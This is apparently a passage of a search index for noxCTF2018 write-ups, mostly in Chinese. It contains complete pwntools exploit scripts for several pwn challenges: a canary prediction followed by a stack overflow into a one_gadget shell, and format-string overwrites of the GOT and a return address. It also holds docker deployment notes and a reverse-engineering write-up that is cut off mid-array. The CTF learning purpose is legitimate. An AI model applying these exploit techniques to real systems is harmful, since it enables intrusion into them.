(i + idx + remove_num)] = 0; } } *cnt -= remove_num; // bug here } } } A negative number will lead to cnt be greater than 10, which to say, we can print the content behand arg_list[328] on the stack then we can leak libc. Most importantly, we can use edit(10, payload) to modify retaddr to one_gadget. Then we're able to get a shell. ''' for i in xrange ( 10 ): add ( str ( i ) * 31 ) remove_consecutive ( 9 , '-6' ) show () io . recvuntil ( \" \\x7f \" ) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] + ' \\0\\0 ' ) - 0x5f1168 success ( \"libc\" , libc . address ) # DEBUG() one_gadget = libc . address + 0x45216 edit ( 10 , 'aaaaaaaa' + p64 ( canary ) + 'bbbbbbbb' + p64 ( one_gadget )[: - 1 ]) leave () io . interactive () ''' noxCTF2018_The_Black_Canary [master\u25cf\u25cf] python exp.py r [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/TheBlackCanary' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to chal.noxale.com on port 6667: Done [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] canary -> 0xaa1fb7311f1f [+] libc -> 0x7fbfa7624000 [*] Switching to interactive mode You could have saved them all $ cat flag noxCTF{Mas7er_0f_ROPcha1ns} $ [*] Closed connection to chal.noxale.com port 6667 '''","title":"The Black Canary"},{"location":"noxCTF2018/pwn/TheBlackCanary/writeup/#_1","text":"\u53ef\u8f93\u5165\u8d1f\u6570\uff0c\u8fbe\u5230\u6570\u7ec4\u8d8a\u754c\u7684\u76ee\u7684\uff0c\u4ece\u800c\u53ef\u4ee5\u5411\u540e\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002\u4f46\u56e0\u6ea2\u51fa\u9650\u5236\uff0c\u5fc5\u987b\u5148\u8986\u76d6canary\uff0c\u800ccanary\u65e0\u6cd5\u6cc4\u9732\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"noxCTF2018/pwn/TheBlackCanary/writeup/#_2","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * from time import sleep import os import sys elfPath = \"./TheBlackCanary\" libcPath = \"./libc.so.6\" remoteAddr = \"chal.noxale.com\" remotePort = 6667 context . binary = elfPath elf = context . binary if sys . argv [ 1 ] == \"l\" : io = process ( elfPath ) libc = elf . libc else : if sys . argv [ 1 ] == \"d\" : io = process ( elfPath , env = { \"LD_PRELOAD\" : libcPath }) else : io = remote ( remoteAddr , remotePort ) if libcPath : libc = ELF ( libcPath ) # context.log_level = \"debug\" context . terminal = [ \"deepin-terminal\" , \"-x\" , \"sh\" , \"-c\" ] success = lambda name , value : log . success ( \"{} -> {:#x}\" . format ( name , value )) def DEBUG (): info ( \"PID -> {}\" . format ( io . pid )) raw_input ( \"DEBUG: \" ) def show (): io . sendlineafter ( \"die \\n \" , \"1\" ) def add ( argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"2\" ) io . sendafter ( \": \\n \" , argument ) def edit ( idx , argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"3\" ) io . sendlineafter ( \"? \\n \" , str ( idx )) io . sendlineafter ( \": \\n \" , argument ) def remove_single ( idx ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"1\" ) io . sendlineafter ( \"remove? \\n \" , str ( idx )) def remove_consecutive ( idx_start , num ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"2\" ) io . sendlineafter ( \"start? \\n \" , str ( idx_start )) io . sendlineafter ( \"remove? \\n \" , str ( num )) def leave (): io . sendlineafter ( \"die \\n \" , \"5\" ) get_canary = lambda : int ( os . popen ( \"./set_canary\" ) . read () . strip (), 16 ) if __name__ == \"__main__\" : ''' This challenge named \"The Black Canary\" suggests there must be something interesting with canary. And when I take a look at .init_array, an interesting function appears(I call it set_canary, located at 0x4008C7). unsigned __int64 set_canary() { int v0; // ebx unsigned __int64 v1; // rbx int v2; // er12 unsigned __int64 v3; // ST08_8 time_t v4; // rbx unsigned __int64 v5; // ST08_8 time_t v6; // ST08_8 time_t v7; // ST08_8 unsigned __int64 result; // rax time(0LL); time(0LL); v0 = time(0LL) >> 24; v1 = (unsigned __int64)(unsigned __int8)(v0 ^ (unsigned __int64)getenv(name)) << 24; v2 = time(0LL) >> 16; v3 = v1 + ((unsigned __int64)(unsigned __int8)(v2 ^ (unsigned __int64)getenv(name)) << 16); v4 = time(0LL) >> 8; v5 = (unsigned __int16)((((unsigned __int16)v4 ^ (unsigned __int16)time(0LL)) << 8) & 0xFF00) + v3; v6 = ((time(0LL) << 32) & 0xFF00000000LL) + v5; v7 = time(0LL) + v6; LODWORD(v4) = time(0LL) >> 24; LODWORD(v4) = (time(0LL) >> 16) + v4; LODWORD(v4) = (time(0LL) >> 8) + v4; result = ((unsigned __int64)(unsigned __int8)(v4 + time(0LL)) << 40) + v7; __writefsqword(0x28u, result); return result; } And we know that time(0) is predictable, as a result, we're able to predict canary. So if there is a stack_overflow_bug, this challenge will be easy to be pwned. ''' canary = get_canary () success ( \"canary\" , canary ) ''' The bof bug will appear it we use remove_consecutive() with a negative amount of arguments. void __fastcall remove_consecutive(char *arg_list, _DWORD *cnt) { size_t len; // rax char idx; // [rsp+15h] [rbp-Bh] char remove_num; // [rsp+16h] [rbp-Ah] char i; // [rsp+17h] [rbp-9h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); idx = 0; remove_num = 0; i = 0; print(\"With which argument would you like to start?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &idx); getchar(); if ( idx < 0 || (char)*cnt <= idx ) { print(\"Index not in range\"); } else { print(\"How many arguments would you like to remove?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &remove_num); // negative getchar(); if ( remove_num + idx < (char)*cnt ) { for ( i = 0; i < remove_num; ++i ) { if ( remove_num + i + idx >= (char)*cnt ) { arg_list[32 * (idx + i)] = 0; } else { len = strlen(&arg_list[32 * (i + idx + remove_num)]); strncpy(&arg_list[32 * (idx + i)], &arg_list[32 * (i + idx + remove_num)], len + 1); arg_list[32 * (i + idx + remove_num)] = 0; } } *cnt -= remove_num; // bug here } } } A negative number will lead to cnt be greater than 10, which to say, we can print the content behand arg_list[328] on the stack then we can leak libc. Most importantly, we can use edit(10, payload) to modify retaddr to one_gadget. Then we're able to get a shell. ''' for i in xrange ( 10 ): add ( str ( i ) * 31 ) remove_consecutive ( 9 , '-6' ) show () io . recvuntil ( \" \\x7f \" ) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] + ' \\0\\0 ' ) - 0x5f1168 success ( \"libc\" , libc . address ) # DEBUG() one_gadget = libc . address + 0x45216 edit ( 10 , 'aaaaaaaa' + p64 ( canary ) + 'bbbbbbbb' + p64 ( one_gadget )[: - 1 ]) leave () io . interactive () ''' noxCTF2018_The_Black_Canary [master\u25cf\u25cf] python exp.py r [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/TheBlackCanary' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to chal.noxale.com on port 6667: Done [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] canary -> 0xaa1fb7311f1f [+] libc -> 0x7fbfa7624000 [*] Switching to interactive mode You could have saved them all $ cat flag noxCTF{Mas7er_0f_ROPcha1ns} $ [*] Closed connection to chal.noxale.com port 6667 '''","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"},{"location":"noxCTF2018/pwn/TheNameCalculator/writeup/","text":"\u6f0f\u6d1e\u5206\u6790 \u00b6 \u53c8\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6700\u540e\u8986\u76d6\u4e86exit\u51fd\u6570\u7684got\u8868\u3002 \u4e2d\u95f4\u6709\u4e2axor\u7f16\u7801\u7684\u8fc7\u7a0b\uff0c\u9700\u8981\u5199\u4e2a\u5bf9\u5e94\u7684\u89e3\u7801\uff08\u4e0e\u7f16\u7801\u4e00\u6837\u6d41\u7a0b\uff09 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 5678 IP = \"127.0.0.1\" PORT = 9999 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./TheNameCalculator\" # code = context.binary = ELF(binary) # if args['LIBDEBUG']: # os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits) # if args['LIBC']: # os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC']) # libc = code.libc # libc.symbols['main_arena'] = libc.symbols['__malloc_hook'] + 0x10 # libc.symbols['one_gadget'] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( binary ) rand = 111458341 print io . recvline () payload1 = \"A\" * 0x1c + p32 ( rand ) gdb . attach ( io , ''' b *0x08048625 b *0x080486D5 b *0x080487C2 c ''' ) io . send ( payload1 ) io . recvline () the_exit = 0x0804A024 supersecret = 0x08048596 def encode ( payload ): xor_chr = 0x5F7B4153 if len ( payload ) % 4 != 0 : print \"Payload is not the multiple 4!\" exit ( 0 ) result = \"\" for i in range ( 0 , 24 , 1 ): res = \"\" orig = u32 ( payload [ i : i + 4 ]) res = p32 ( orig ^ xor_chr ) payload = payload [ 0 : i ] + res + payload [ i + 4 :] # print payload return payload # payload2_orig = (\"AAAA\" + \"%12$x.\"*3).ljust(28, \"\\x00\") payload2_orig = p32 ( 0x0804A024 ) + \" %34194c \" + \"%12$hn\" payload2_orig = payload2_orig . ljust ( 28 , \" \\x00 \" ) payload2 = encode ( payload2_orig ) io . send ( payload2 ) io . interactive ()","title":"The Name Calculator"},{"location":"noxCTF2018/pwn/TheNameCalculator/writeup/#_1","text":"\u53c8\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6700\u540e\u8986\u76d6\u4e86exit\u51fd\u6570\u7684got\u8868\u3002 \u4e2d\u95f4\u6709\u4e2axor\u7f16\u7801\u7684\u8fc7\u7a0b\uff0c\u9700\u8981\u5199\u4e2a\u5bf9\u5e94\u7684\u89e3\u7801\uff08\u4e0e\u7f16\u7801\u4e00\u6837\u6d41\u7a0b\uff09","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"noxCTF2018/pwn/TheNameCalculator/writeup/#_2","text":"#!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 5678 IP = \"127.0.0.1\" PORT = 9999 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./TheNameCalculator\" # code = context.binary = ELF(binary) # if args['LIBDEBUG']: # os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits) # if args['LIBC']: # os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC']) # libc = code.libc # libc.symbols['main_arena'] = libc.symbols['__malloc_hook'] + 0x10 # libc.symbols['one_gadget'] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( binary ) rand = 111458341 print io . recvline () payload1 = \"A\" * 0x1c + p32 ( rand ) gdb . attach ( io , ''' b *0x08048625 b *0x080486D5 b *0x080487C2 c ''' ) io . send ( payload1 ) io . recvline () the_exit = 0x0804A024 supersecret = 0x08048596 def encode ( payload ): xor_chr = 0x5F7B4153 if len ( payload ) % 4 != 0 : print \"Payload is not the multiple 4!\" exit ( 0 ) result = \"\" for i in range ( 0 , 24 , 1 ): res = \"\" orig = u32 ( payload [ i : i + 4 ]) res = p32 ( orig ^ xor_chr ) payload = payload [ 0 : i ] + res + payload [ i + 4 :] # print payload return payload # payload2_orig = (\"AAAA\" + \"%12$x.\"*3).ljust(28, \"\\x00\") payload2_orig = p32 ( 0x0804A024 ) + \" %34194c \" + \"%12$hn\" payload2_orig = payload2_orig . ljust ( 28 , \" \\x00 \" ) payload2 = encode ( payload2_orig ) io . send ( payload2 ) io . interactive ()","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"},{"location":"noxCTF2018/pwn/believeMe/writeup/","text":"\u5206\u6790 \u00b6 \u672a\u5f00\u542fASLR\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools IP = \"18.223.228.52\" PORT = 13337 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./believeMe\" code = context . binary = ELF ( binary ) if args [ 'LIBDEBUG' ]: os . environ [ 'LD_LIBRARY_PATH' ] = '/dbg{}/lib' . format ( code . bits ) if args [ 'LIBC' ]: os . environ [ 'LD_PRELOAD' ] = os . path . abspath ( args [ 'LIBC' ]) libc = code . libc libc . symbols [ 'main_arena' ] = libc . symbols [ '__malloc_hook' ] + 0x10 libc . symbols [ 'one_gadget' ] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( \"./believeMe\" ) nox = 0x0804867B # \u539fret address\u4f4d\u4e8e0xffffdd1c\u3000\u4e3alibc_start_main\u4e2d\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5b9e\u9645\u8c03\u8bd5\u53d1\u73b0\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e86esp\uff0c\u5e94\u8be5\u4e3a0xffffdd2c stack = 0xffffdd2c payload = p32 ( 0xffffdd2e ) + p32 ( 0xffffdd2c ) + \\ \" %2044c \" + \"%9$hn\" + \" %32375c \" + \"%10$hn\" # payload = \"%x.\" * 15 # payload = p32(0xffffdd26) + p32(0xffffdd24) + \\ # \".%7$x.\" + \"%22$x.\" + \"%23$x.\" + \"%24$x.\" print payload print io . recvrepeat ( timeout = 0.5 ) gdb . attach ( io , ''' b *0x080487D3 c ''' ) io . sendline ( payload ) io . interactive ()","title":"believe Me"},{"location":"noxCTF2018/pwn/believeMe/writeup/#_1","text":"\u672a\u5f00\u542fASLR\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002","title":"\u5206\u6790"},{"location":"noxCTF2018/pwn/believeMe/writeup/#_2","text":"#!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools IP = \"18.223.228.52\" PORT = 13337 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./believeMe\" code = context . binary = ELF ( binary ) if args [ 'LIBDEBUG' ]: os . environ [ 'LD_LIBRARY_PATH' ] = '/dbg{}/lib' . format ( code . bits ) if args [ 'LIBC' ]: os . environ [ 'LD_PRELOAD' ] = os . path . abspath ( args [ 'LIBC' ]) libc = code . libc libc . symbols [ 'main_arena' ] = libc . symbols [ '__malloc_hook' ] + 0x10 libc . symbols [ 'one_gadget' ] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( \"./believeMe\" ) nox = 0x0804867B # \u539fret address\u4f4d\u4e8e0xffffdd1c\u3000\u4e3alibc_start_main\u4e2d\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5b9e\u9645\u8c03\u8bd5\u53d1\u73b0\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e86esp\uff0c\u5e94\u8be5\u4e3a0xffffdd2c stack = 0xffffdd2c payload = p32 ( 0xffffdd2e ) + p32 ( 0xffffdd2c ) + \\ \" %2044c \" + \"%9$hn\" + \" %32375c \" + \"%10$hn\" # payload = \"%x.\" * 15 # payload = p32(0xffffdd26) + p32(0xffffdd24) + \\ # \".%7$x.\" + \"%22$x.\" + \"%23$x.\" + \"%24$x.\" print payload print io . recvrepeat ( timeout = 0.5 ) gdb . attach ( io , ''' b *0x080487D3 c ''' ) io . sendline ( payload ) io . interactive ()","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/believeMe/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"},{"location":"noxCTF2018/reverse/Att3nti0n/writeup/","text":"Att3nti0n \u00b6 \u76f4\u63a5Ida\u6253\u5f00\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4f4d\u5230\u9a8c\u8bc1\u51fd\u6570 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int result ; // eax __main (); if ( argc == 2 ) { if ( ( unsigned __int8 ) CheckKey ( argv [ 1 ]) == 1 ) fwrite ( \"Correct! :) \\n \" , 1u , 0xCu , ( FILE * ) __iob [ 0 ]. _ptr ); else fwrite ( \"Not correct password! :( \\n \" , 1u , 0x19u , & __iob [ 2 ]); getchar (); result = 0 ; } else { fwrite ( \"Usage: F_ckIt.exe <Decrypted key> \\n \" , 1u , 0x22u , & __iob [ 2 ]); result = 1 ; } return result ; } \u5bf9CheckKey\u51fd\u6570\u8fdb\u884c\u9006\u5411\uff0c\u8be5\u51fd\u6570\u7684\u529f\u80fd\u662f\u5bf9\u8f93\u5165\u7684key\u4e0e4\u5b57\u8282\u6570\u7ec4\u5faa\u73af\u5f02\u6216\u3002\u7136\u540e\u8ddf\u4e00\u4e2a\u56fa\u5b9a\u7684buf\u53bb\u5bf9\u6bd4\uff0c\u89e3\u5bc6\u8fd9\u4e2abuf\u5982\u4e0b\uff1a BYTE g_array1 [] = { 0x13 , 0x37 , 0x73 , 0x31 }; BYTE g_array2 [] = { 0x7d , 0x58 , 0x0b , 0x65 , 0x55 , 0x4c , 0x35 , 0x50 , 0x78 , 0x52 , 0x53 , 0x41 , 0x72 , 0x44 , 0x00 , 0x46 , 0x7c , 0x45 , 0x17 , 0x1f , 0x3d , 0x17 , 0x35 , 0x58 , 0x7d , 0x53 , 0x53 , 0x42 , 0x7c , 0x5a , 0x16 , 0x45 , 0x7b , 0x5e , 0x1d , 0x56 , 0x33 , 0x52 , 0x1f , 0x42 , 0x76 , 0x17 , 0x1a , 0x5f , 0x60 , 0x5e , 0x17 , 0x54 , 0x33 , 0x43 , 0x1b , 0x54 , 0x33 , 0x55 , 0x1a , 0x5f , 0x72 , 0x45 , 0x0a , 0x4c }; for ( int i = 63 ; i >= 0 ;) { BYTE v3 = g_array1 [ i % 4 ]; int v4 = i -- ; char c = v3 ^ g_array2 [ v4 ]; szFlag [ i + 1 ] = c ; printf ( \"%c\" , c ); } \u4f46\u662f\u5f97\u5230\u7684\u7ed3\u679c\u4e3a noxTF{Fake password.. Find something else inside the binary} \u5e76\u4e0d\u662f\u6539\u7a0b\u5e8f\u6b63\u786e\u7684key\u3002 \u4ed4\u7ec6\u67e5\u770b\u7a0b\u5e8f\uff0c0x00401560\u5b58\u5728\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u51fd\u6570\u3002\u5206\u6790\u8be5\u51fd\u6570\uff0c\u662f\u5148\u521d\u59cb\u5316\u4e00\u5757\u5c40\u90e8\u53d8\u91cfbuf\uff0c\u7136\u540e\u5224\u65ad\u8fd9\u5757buf\u7684\u5f00\u59344\u5b57\u8282\u662f\u5426\u4e3a0x55 ,0x89,0xe5,0x60\uff0c\u7136\u540e\u5bf9\u8fd9\u5757buf\u8fdb\u884c\u4e86\u4e00\u4e9b\u4fee\u6539\u64cd\u4f5c\uff0c\u7136\u540e\u7533\u8bf7\u4e00\u5757\u53ef\u6267\u884c\u5185\u5b58\u62f7\u8d1d\u8fc7\u53bb\u8fd0\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u731c\u6d4b\u8fd9\u5757\u5185\u5b58\u662f\u4e00\u6bb5\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u4f7f\u7528\u4e0a\u9762\u7684\u89e3\u5bc6\u51fd\u6570\uff0c\u5bf9\u8fd9\u5757buf\u8fdb\u884c\u89e3\u5bc6\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b: 00030000 55 push ebp 00030001 89E5 mov ebp , esp 00030003 60 pushad 00030004 31 C0 xor eax , eax 00030006 BE AEF92800 mov esi , 0x28F9AE ; ASCII \"yxoCQl_&ss$yHQBYt &'y\" H # e $ HT '' & 6 j \" 0003000 B BF AEF92800 mov edi , 0x28F9AE ; ASCII \"yxoCQl_&ss$yHQBYt &'y\" H # e $ HT '' & 6 j \" 00030010 AC lods byte ptr ds :[ esi ] 00030011 84 C0 test al , al 00030013 74 05 je short 0003001 A 00030015 34 17 xor al , 0x17 00030017 AA stos byte ptr es :[ edi ] 0003001 8 ^ EB F6 jmp short 00030010 0003001 A 61 popad 0003001 B 89 EC mov esp , ebp 0003001 D 5 D pop ebp 0003001 E C3 ret \u6700\u540ecall eax\u8df3\u5165\u6267\u884c\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u5c31\u662f\u6b63\u786e\u7684flag\u3002 noxTF{H1dd3n_FUNc710n5_4r3_C001!}","title":"Att3nti0n"},{"location":"noxCTF2018/reverse/Att3nti0n/writeup/#att3nti0n","text":"\u76f4\u63a5Ida\u6253\u5f00\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4f4d\u5230\u9a8c\u8bc1\u51fd\u6570 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int result ; // eax __main (); if ( argc == 2 ) { if ( ( unsigned __int8 ) CheckKey ( argv [ 1 ]) == 1 ) fwrite ( \"Correct! :) \\n \" , 1u , 0xCu , ( FILE * ) __iob [ 0 ]. _ptr ); else fwrite ( \"Not correct password! :( \\n \" , 1u , 0x19u , & __iob [ 2 ]); getchar (); result = 0 ; } else { fwrite ( \"Usage: F_ckIt.exe <Decrypted key> \\n \" , 1u , 0x22u , & __iob [ 2 ]); result = 1 ; } return result ; } \u5bf9CheckKey\u51fd\u6570\u8fdb\u884c\u9006\u5411\uff0c\u8be5\u51fd\u6570\u7684\u529f\u80fd\u662f\u5bf9\u8f93\u5165\u7684key\u4e0e4\u5b57\u8282\u6570\u7ec4\u5faa\u73af\u5f02\u6216\u3002\u7136\u540e\u8ddf\u4e00\u4e2a\u56fa\u5b9a\u7684buf\u53bb\u5bf9\u6bd4\uff0c\u89e3\u5bc6\u8fd9\u4e2abuf\u5982\u4e0b\uff1a BYTE g_array1 [] = { 0x13 , 0x37 , 0x73 , 0x31 }; BYTE g_array2 [] = { 0x7d , 0x58 , 0x0b , 0x65 , 0x55 , 0x4c , 0x35 , 0x50 , 0x78 , 0x52 , 0x53 , 0x41 , 0x72 , 0x44 , 0x00 , 0x46 , 0x7c , 0x45 , 0x17 , 0x1f , 0x3d , 0x17 , 0x35 , 0x58 , 0x7d , 0x53 , 0x53 , 0x42 , 0x7c , 0x5a , 0x16 , 0x45 , 0x7b , 0x5e , 0x1d , 0x56 , 0x33 , 0x52 , 0x1f , 0x42 , 0x76 , 0x17 , 0x1a , 0x5f , 0x60 , 0x5e , 0x17 , 0x54 , 0x33 , 0x43 , 